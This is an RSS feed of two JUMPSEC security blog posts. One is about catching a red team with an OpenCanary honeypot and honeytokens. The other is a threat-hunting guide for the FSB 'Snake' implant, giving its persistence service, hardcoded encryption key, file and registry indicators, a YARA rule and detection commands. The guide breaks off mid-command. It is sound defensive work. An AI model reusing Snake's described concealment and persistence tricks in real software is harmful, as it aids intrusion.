<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Detection</title>
    <link>//localhost:1313/categories/detection/</link>
    <description>Recent content in Detection on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Tue, 15 Oct 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/detection/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>Active Cyber Defence - Taking back control</title>
      <link>//localhost:1313/articles/2024/10/2024-10-15-active-cyber-defence-taking-back-control/</link>
      <pubDate>Tue, 15 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/10/2024-10-15-active-cyber-defence-taking-back-control/</guid>
      <description>
        
        
        &lt;p&gt;Every good cybersecurity article needs a Sun Tzu quote, here is one lesser known quote from Sun Tzu to start us off.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;1&#34; alt=&#34;Yeah getting a Domain Admin is cool but have you ever caught a Red Team using a Honeypot? Sun Tzu&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;What Happened?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-happened&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-happened&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Recently, JUMPSEC’s Detection and Response Team (DART) caught a Red Team  inside one of our MxDR clients&amp;rsquo; networks using a honeypot server. The honeypot server was set up using Thinkst Applied Research’s project called &lt;a href=&#34;https://github.com/thinkst/opencanary&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OpenCanary&lt;/a&gt;. This open-source project from Thinkst emulates different network protocols and when interacted with, creates an alert providing information to the defensive team, such as the source of the request.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;An unfair advantage&lt;span class=&#34;absolute -mt-20&#34; id=&#34;an-unfair-advantage&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#an-unfair-advantage&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We believe all organisations should be able to incrementally build on their level of security, year-on-year. This means leaving generic behind and focusing on the specific threats you face, and outcomes you need to be secure from them. To do this, we draw on the expertise and attacker mindset of our offensive Team to develop sophisticated attack paths tailored to each client’s environment. These are then used to test the defences and monitoring systems set up by our Detection and Response Team (DART).&lt;/p&gt;
&lt;p&gt;As a member of the DART working on the defensive side, I find these engagements particularly rewarding. I’m confident that this sentiment is shared by the offensive team and our clients as well, since both teams ultimately work together to strengthen the security of our client.&lt;/p&gt;
&lt;p&gt;This collaborative, and at times competitive, dynamic between the teams where the defensive team gains insights into the inner workings of exploit tools, while the offensive team learns how to avoid detection, helps us to create new detections and anticipate potential future evasion techniques.&lt;/p&gt;
&lt;p&gt;If you are a Blue Teamer or working on the defensive side in a SOC and have experienced a Purple team engagement, you may have noticed that almost always the offensive team will achieve their set objectives. Often this is thanks to the client’s IT admins with their easy-to-guess passwords which are set to never expire, or SMB shares with credentials in a cleartext file, or thanks to Active Directory Certificate Services; a gift that keeps on giving&lt;/p&gt;
&lt;p&gt;Detection and or prevention for all of these techniques is a challenge for a defender.&lt;/p&gt;
&lt;p&gt;One can only cover so many techniques from MITRE ATT&amp;amp;CK bingo.&lt;/p&gt;
&lt;p&gt;[learn_more caption=&amp;ldquo;MITRE ATT&amp;amp;CK bingo.&amp;rdquo; state=&amp;ldquo;open&amp;rdquo;] The process of shouting “Bingo!” when you have covered a technique from the ATT&amp;amp;CK matrix. Just because you have identified a single way to detect a technique does not mean you can colour the box green, adversaries have multiple ways they can perform most techniques. &lt;a href=&#34;https://attack.mitre.org/resources/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read more about how NOT to use ATT&amp;amp;CK&lt;/a&gt;  [/learn_more]&lt;/p&gt;
&lt;p&gt;To make matters more complicated, your adversary—in this case, the offensive team—sometimes starts with access to the client&amp;rsquo;s network (an assumed breach), which is common practice when aiming to fully leverage the offensive team&amp;rsquo;s capabilities.&lt;/p&gt;
&lt;p&gt;So, you can quickly imagine the offensive team enumerating and accessing network shares as a regular user only to discover admin credentials within a PowerShell script. In some cases we have seen these  scripts were created by an IT admin with domain admin privileges to automate various tasks and simplify their work. You might think this scenario is uncommon, however it is how &lt;a href=&#34;https://arstechnica.com/information-technology/2022/09/uber-was-hacked-to-its-core-purportedly-by-an-18-year-old-here-are-the-basics/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Uber was hacked&lt;/a&gt; in 2022 and this happens so frequently that there are memes on X/Twitter on the topic.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/4-249x300.jpg&#34; title=&#34;4&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;As a defender all those latest detections you put in place to detect Mimikatz or the sophisticated bloodhound queries are now useless. The adversary (again, the offensive team in this case) got the keys to the castle and can stroll right through the front door. This situation can feel like an overwhelming challenge and an unfair advantage for the adversary, so what’s a defender to do?&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5.gif&#34; title=&#34;5&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Go ahead, cry if you need to—let it out. But no, that&amp;rsquo;s not where it ends. I&amp;rsquo;m not saying you shouldn&amp;rsquo;t cry, but after you do, it&amp;rsquo;s time to regain control.&lt;/p&gt;
&lt;h2&gt;&amp;ldquo;No more tears&amp;rdquo; formula&lt;span class=&#34;absolute -mt-20&#34; id=&#34;no-more-tears-formula&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#no-more-tears-formula&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Consider it this way: an adversary has entered your environment, but it&amp;rsquo;s your environment—you know what happens in this environment from the logs you have and pretty dashboards that you see everyday, you know which of your IT admins still use &lt;a href=&#34;https://attack.mitre.org/software/S0029/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PsExec&lt;/a&gt; to troubleshoot problems on remote servers, you know which developer has created a script that bruteforces your entire AD user database just to create an inventory of users. Now, the attacker is on your turf, and you set the rules of engagement. You control what they see, what they interact with, and how you can use this knowledge to your advantage.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/6.png&#34; title=&#34;6&#34; alt=&#34;I want to play a game&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Instead of passively waiting for an alert to trigger, you take an active role in countering the threat actor through Active Cyber Defence. This involves proactively engaging, disrupting, and countering the attack. To clarify, this isn&amp;rsquo;t about hacking back. Rather, it&amp;rsquo;s about setting traps within your environment and waiting for the threat actor to interact with them—one type of trap is is known as a honeytoken. Honeytokens are decoys that are designed to detect unauthorised or malicious activity within a system in your network. They can take many forms, such as fake credentials, files, user accounts that seem legitimate but are actually traps. When an attacker interacts with a honeytoken, it triggers an alert, allowing the defenders to detect a breach or malicious intent early.  The challenge then becomes how to implement this strategy in a way that is easy to deploy, maintain, and most importantly, doesn&amp;rsquo;t increase your attack surface.&lt;/p&gt;
&lt;p&gt;Let’s revisit what actually happened in the incident I mentioned previously after being challenged by an assumed breach in one of our Managed Extended Detection &amp;amp; Response (MxDR) clients, we realised the need to improve our response and regain control. Over the years, we had developed numerous detection use cases in collaboration with our offensive team, but on the flip side, the offensive team also created bypass techniques and constantly introduced new evasion strategies. We needed a quick win—something that would provide us with high-fidelity alerts as early as possible in the attack cycle, or in some cases, even at an advanced stage of the adversary&amp;rsquo;s objectives.&lt;/p&gt;
&lt;p&gt;We deployed &lt;a href=&#34;https://github.com/thinkst/opencanary&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OpenCanary&lt;/a&gt;; a free and open-source decentralised honeypot by the amazing people at Thinkst Applied Research. We configured that server to expose fake SSH and HTTP servers. The HTTP server had a web page that looked like this.&lt;/p&gt;
&lt;p&gt;An old Synology DiskStation NAS server with usernames and passwords fields. Now tell me if you are an offensive security consultant who has done a little HackTheBox boxes or played in CTF what’s the first thing you are going to do to this page?&lt;/p&gt;
&lt;p&gt;Naturally, you&amp;rsquo;d try &lt;code&gt;admin/admin&lt;/code&gt; or &lt;code&gt;admin/password&lt;/code&gt; combinations. If not, I might question your L33T hacker credentials and that’s exactly what the offensive team in question did during their reconnaissance. The mere fact that they visited this page had already triggered an alert in our system. No one was supposed to access this page, and its existence was known to only a few people. Only the offensive team, after scanning the entire network, discovered this server with an exposed, outdated HTTP service and decided to take their shot.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In combat, deception can strengthen the weaker side. When all other factors are equal the more deceptive player or the team will always win. - Barton Whaley&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I had configured this alert to be sent to two different outputs (Google + Slack). When I first saw the alert, I was in complete disbelief. My mind started racing—the excitement, the adrenaline. Thoughts like “There’s no way,” “This can’t be real,” “It must be a misfire from the canary server restarting,” kept running through my head. But then I remembered, I had fine-tuned that alert a long time ago. “Did I really just catch something…?” No, that can’t be it. I needed to double-check—actually, triple-check—to be sure.&lt;/p&gt;
&lt;p&gt;[box type=&amp;ldquo;shadow&amp;rdquo;]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;{ &amp;ldquo;dst_host&amp;rdquo;: &amp;ldquo;172.XX.X.X&amp;rdquo;, &amp;ldquo;dst_port&amp;rdquo;: 80, &amp;ldquo;local_time&amp;rdquo;: &amp;ldquo;2024-06-19 13:20:12.162738&amp;rdquo;, &amp;ldquo;local_time_adjusted&amp;rdquo;: &amp;ldquo;2024-06-19 13:20:12.162764&amp;rdquo;, &amp;ldquo;logdata&amp;rdquo;: { &amp;ldquo;HOSTNAME&amp;rdquo;: &amp;ldquo;10.XXX.XXX.XX&amp;rdquo;, &amp;ldquo;PASSWORD&amp;rdquo;: &amp;ldquo;&amp;rdquo;, &amp;ldquo;PATH&amp;rdquo;: &amp;ldquo;/index.html&amp;rdquo;, &amp;ldquo;SKIN&amp;rdquo;: &amp;ldquo;nasLogin&amp;rdquo;, &amp;ldquo;USERAGENT&amp;rdquo;: &amp;ldquo;Mozilla/5.0 (Windows NT 6.4;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.2535.51 Safari/537.36 Edge/125.0.2535.10122&amp;rdquo;, &amp;ldquo;USERNAME&amp;rdquo;: &amp;ldquo;admin&amp;rdquo; }, &amp;ldquo;logtype&amp;rdquo;: 3001, &amp;ldquo;node_id&amp;rdquo;: &amp;ldquo;CANARY-SERVER&amp;rdquo;, &amp;ldquo;src_host&amp;rdquo;: &amp;ldquo;10.XXX.XXX.XX&amp;rdquo;, &amp;ldquo;src_port&amp;rdquo;: 44214, &amp;ldquo;utc_time&amp;rdquo;: &amp;ldquo;2024-06-19 13:20:12.162760&amp;rdquo; }&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Details of alert [/box]&lt;/p&gt;
&lt;p&gt;So, I triple-checked. The client had an ongoing assumed breach engagement, but I wasn’t directly involved in the day-to-day alerts. I looped in my fellow DART members for a sanity check, and we agreed to raise it with the client to confirm, just to be absolutely certain. And yes, we did it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/celebrate.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;You might think it’s not such a big achievement, but let me tell you…as a Defender, catching an attacker in the assumed breach, right in their reconnaissance stage, using such a simple tool is nothing short of incredible. The satisfaction that comes from outmanoeuvring them before they even trigger other detections is beyond words. This is the kind of victory that reinforces why we do what we do—staying one step ahead and stopping the threat before it even starts.&lt;/p&gt;
&lt;p&gt;We chose OpenCanary over other honeypots like Cowrie, Mailoney, and Snare for several reasons, but the primary one is its ease of deployment—especially if you have Docker installed on your host. It&amp;rsquo;s modular and can simulate various services such as SSH, FTP, HTTP, and VNC, plus it can send alerts directly to a webhook. This makes deployment and maintenance straightforward. In contrast, using multiple honeypot services would require installing each one separately, collecting their logs, forwarding them to a centralised SIEM, and setting up alerts there. If any part of that pipeline fails, you risk missing your most critical alerts.&lt;/p&gt;
&lt;p&gt;Deploying OpenCanary is straightforward, but some maintenance is needed depending on your environment. If you&amp;rsquo;re using regular vulnerability scanners like Nessus or network mapping tools like PRTG Network Monitor, you&amp;rsquo;ll want to add those IP ranges to the &lt;code&gt;ip.ignorelist&lt;/code&gt; in the configuration file to avoid false alarms. After that, you can connect it to your Teams or GoogleChat via webhook, forward the alerts to your SIEM, or set up email notifications—whatever works best for you. Once configured, you can set it and forget it.&lt;/p&gt;
&lt;p&gt;Setting up a server like OpenCanary is just one of many ways to set traps for your adversaries. For instance, you can create multiple fake user accounts in Active Directory, each with different roles. (Pro tip: Use ChatGPT to help you generate realistic fake personas and create fake LinkedIn profiles for them.) Ensure these accounts have complex passwords, and configure your SIEM to alert you if anyone tries to authenticate them. If you use Microsoft Defender for Identity(MDI), you can designate these accounts as honeytokens, and MDI will handle the rest (&lt;a href=&#34;https://learn.microsoft.com/en-us/defender-for-identity/entity-tags%29&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/defender-for-identity/entity-tags)&lt;/a&gt;. This is particularly useful during the Red Team&amp;rsquo;s reconnaissance phase when they might use tools like BloodHound to enumerate users from the Domain Controller—triggering an alert in the process. It&amp;rsquo;s a simple win that saves you from having to baseline requests sent to the DC for your detection queries.&lt;/p&gt;
&lt;p&gt;Additionally, you can visit &lt;a href=&#34;https://canarytokens.org&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;canarytokens.org&lt;/a&gt; to easily create various types of Canary tokens, such as Microsoft Word/Excel or PDF documents that trigger an alert when opened. These files can be strategically placed in your organisation&amp;rsquo;s internal shares. Tools like &lt;a href=&#34;https://github.com/blacklanternsecurity/MANSPIDER&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MANSPIDER&lt;/a&gt;, which crawl SMB shares in search of valuable data, may stumble upon and activate these Canarytokens.&lt;/p&gt;
&lt;p&gt;One of my favourite examples involves using a &amp;ldquo;Fast Redirect Token&amp;rdquo; from &lt;a href=&#34;https://canarytokens.org&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;canarytokens.org&lt;/a&gt; which alerts when someone visits your URL.&lt;/p&gt;
&lt;p&gt;Here is one of our Senior Security Consultants I lured into triggering this alert and getting rickrolled in the process.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll wrap up this blog post by encouraging you to implement Cyber Deception techniques in your environment. These methods aren&amp;rsquo;t new, are often free, easy to set up, and offer some of the most reliable alerts available.&lt;/p&gt;
&lt;p&gt;If you&amp;rsquo;re interested in learning more about Cyber Deception, I highly recommend checking out John Strand’s course, which you can find here: &lt;a href=&#34;https://www.antisyphontraining.com/course/active-defense-and-cyber-deception-with-john-strand/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Active Defense and Cyber Deception with John Strand&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Additionally, be sure to explore the free Canary Tokens service provided by the fantastic team at Thinkst: &lt;a href=&#34;https://canarytokens.org/nest/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Canary Tokens&lt;/a&gt;.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Hunting for &#39;Snake&#39;</title>
      <link>//localhost:1313/articles/2023/05/2023-05-26-hunting-for-snake/</link>
      <pubDate>Fri, 26 May 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/05/2023-05-26-hunting-for-snake/</guid>
      <description>
        
        
        &lt;p&gt;Following the NCSC and CISA’s detailed &lt;a href=&#34;https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;joint advisory&lt;/a&gt; on the highly sophisticated ‘Snake’ cyber espionage tool, JUMPSEC threat intelligence analysts have provided a condensed blueprint for organisations to start proactively hunting for Snake within their network, contextualising key Indicators of Compromise (IoC), and providing additional methods to validate the effectiveness of Snake detections.&lt;/p&gt;
&lt;h1&gt;Snake’s capabilities&lt;/h1&gt;&lt;p&gt;The implant dubbed ‘Snake’ has been attributed to Centre 16 of Russia’s state sponsored FSB. The tool has been collecting intelligence in over 50 countries for up to 20 years, targeting research facilities, government networks, financial services, communications organisations, and other Critical National Infrastructure (CNI) organisations, meaning these organisations should be particularly vigilant and take precautionary steps to protect their networks.&lt;/p&gt;
&lt;p&gt;Described by CISA as Centre 16’s “most sophisticated cyber espionage tool for long-term intelligence collection”, Snake typically targets and infects external facing infrastructure, with its ultimate aim to compromise domain controllers and administrator accounts, enabling attackers to gain widespread access and control within targeted networks.&lt;/p&gt;
&lt;p&gt;Snake achieves these aims though a combination of several advanced technical features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A decentralised model - While the majority of malicious implants listen to and report back to a central node (i.e C2 or Command and Control Server) as part of a centralised infrastructure, Snake leverages a “decentralised” Peer-to-peer (P2P) network, supported by active implants residing on infected systems. As no centralised node acts as C2, commands and their output can be sent, received or retrieved all within the P2P network as nodes communicate with each other to route traffic and store information.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Indistinguishable from legitimate traffic - FSB operators can ensure that all traffic to targeted machines follow the Snake custom HTTP protocol effectively blending with legitimate traffic when using a compromised HTTP server as part of the Snake P2P network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Numerous containerised tools and techniques – The implant conceals a plethora of tools, including network sniffers and keyloggers that can enable further compromise of target networks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Operating as a Kernel Driver (rootkit capabilities / kernel driver) – The aforementioned concealed techniques and tools can subsequently infect machines in Kernel Land while simultaneously leveraging active and passive operational mechanisms to achieve its aims.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;High degree of persistence – To achieve persistence Snake generally registers a service called &amp;ldquo;WerFaultSvc&amp;rdquo; that executes Snake&amp;rsquo;s WerFault.exe located in &amp;ldquo;%windows%\WinSxS\&amp;rdquo;, which decrypts Snake&amp;rsquo;s components and loads them into memory.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The fact that Snake is state sponsored also adds additional resourcing capability, motivation, persistence and potential impact, making this a particularly potent threat given Russian efforts to influence political processes, conduct espionage, and disrupt critical infrastructure.&lt;/p&gt;
&lt;h1&gt;How to detect Snake&lt;/h1&gt;&lt;p&gt;There are numerous threat hunting techniques that can be deployed to detect Snake. However, depending on the type of infrastructure or response mechanisms your organisation has in place, certain techniques may prove more or less effective.&lt;/p&gt;
&lt;p&gt;Here are some points to consider when prioritising how to detect Snake:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Host-Based Detection&lt;/strong&gt; - this type of detection is critical and should be performed regardless of the size of your enterprise. It is a high confidence set of rules, which are key to determining if any of Snake’s components are located on machines connected to the network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Network based detection&lt;/strong&gt; – these type of detection rules could be particularly useful for large scale identification of Snake communication protocols. Ideal for enterprises using intrusion detection systems or firewalls that support Suricata rules deployment.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Memory Analysis&lt;/strong&gt; – Another technique to identify Snake is to investigate memory and see if it is executing at known locations. The CSA provides a useful Volatility plugin to perform this analysis. Unfortunately, this is less scalable and more time consuming, however, security researchers are developing alternatives that can help automating the process at larger scale.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Other Detection Mechanisms and Sigma Rules&lt;/strong&gt; – Sigma rules and Yara rules are being constantly developed as we write and will help speed up and automate the process of hunting for the FSB’s malware. These can often be integrated in SOC/SIEM as well as IR tooling.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Purple Team and Atomic Test Cases&lt;/strong&gt; – A highly efficient way of identifying and covering the detection gaps in your estate is to utilise a purple team approach, leveraging Atomic Red Team test cases which are being developed specifically for this implant.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JUMPSEC have detailed a number of implementable threat hunting detections which at risk organisations may wish to implement here at JUMPSEC Labs. We recommend using a combination of these approaches to effectively mitigate the threat and remove any reliance on a single point of failure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JUMPSEC have not exhaustively detailed each known technique. Additional hunting tools and techniques&lt;/strong&gt; &lt;strong&gt;may continue to be developed and JUMPSEC is actively monitoring NCSC and CISA detections to identify&lt;/strong&gt; &lt;strong&gt;opportunities where IoCs or TTPs can be leveraged.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Host-Based Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;host-based-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#host-based-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;While effective, host-based detections are not without shortcomings within certain environments.&lt;/p&gt;
&lt;p&gt;Host-based detections enable a high degree of confidence based on the totality of positive hits for host-based artifacts, however, many artifacts on the host are easily shifted to exist in a different location, or with a different name, as the files are fully encrypted and accurately identifying these files is difficult.&lt;/p&gt;
&lt;p&gt;To combat these limitations JUMPSEC advises that host-based detection is integration with further manual analysis of positive hits.&lt;/p&gt;
&lt;p&gt;Multiple Snake components can be detected running in the system using different Indicators of Compromise. For example, the Covert Store generated by the implant, can present the following hardcoded encryption key (not always, depending on the malware operator):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;And the same key can be retrieved from the following Windows Registry path when stored:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SECURITY\Policy\Secrets\n&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Furthermore, the following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EB 52 90 4E 54 46 53 20&lt;/p&gt;
&lt;p&gt;EB 5B 90 4E 54 46 53 20&lt;/p&gt;
&lt;p&gt;EB 3C 90 4D 53 44 4F 53&lt;/p&gt;
&lt;p&gt;EB 00 00 00 00 00 00 00&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry and searching for a file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores.&lt;/p&gt;
&lt;p&gt;Another component is the &lt;strong&gt;Registry Blob&lt;/strong&gt; which might appear in the Windows registry when searching for a value of at least 0x1000 bytes in size and a High entropy value of at least 7.9. However, it can typically be found using the following information when its values are left as default:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; Unknown (RegBlob)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Registry Path:&lt;/strong&gt; HKLM\SOFTWARE\Classes\.wav\OpenWithProgId&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Characteristics:&lt;/strong&gt; High Entropy&lt;/p&gt;
&lt;p&gt;Additionally, Snake’s Queue File can be located leveraging a file-system search with a Regular Expression together with searching for High Entropy files using the Yara Rule listed further below. Typically the Queue File can be found with the following information:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typical Name:&lt;/strong&gt; &amp;lt; RANDOM_GUID &amp;gt;.&amp;lt;RANDOM_GUID&amp;gt;.crmlog&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typical Path:&lt;/strong&gt; %windows\registration\&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; High Entropy, file attributes of hidden, system, and archive&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Snake Queue File&lt;/p&gt;
&lt;p&gt;The following Yara rule (named 1.yar) can be used in conjunction with the subsequently listed UNIX and PowerShell commands to detect instances of the Snake Queue FIle:&lt;/p&gt;
&lt;p&gt;1.yar&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule HighEntropy
{
    meta:
        description = &amp;#34;entropy rule&amp;#34;

    condition:
        math.entropy(0, filesize) &amp;gt;= 7.0
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;UNIX command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;find /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \
    &amp;#39;.*\/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog&amp;#39; \
     -exec yara 1.yar {} \;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;PowerShell command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
  $_.FullName -match
  &amp;#39;(?i)/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog$&amp;#39;
} | ForEach-Object {
  yara 1.yar $_.FullName
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Moreover, we can use the Yara rules with the last two components that might indicate the malware running on the host machine: comadmin and werfault.&lt;/p&gt;
&lt;p&gt;Comadmin can be detected using the following information and the previously mentioned Yara rule (1.yar):&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; comadmin.dat&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path:&lt;/strong&gt; %windows%\system32\Com&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; High Entropy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Houses Snake’s kernel driver and the driver’s loader&lt;/p&gt;
&lt;p&gt;Leveraging the previously stated Yara rule (1.yar) we can use the following UNI or PowerShell commands:&lt;/p&gt;
&lt;p&gt;UNIX&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;find /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \
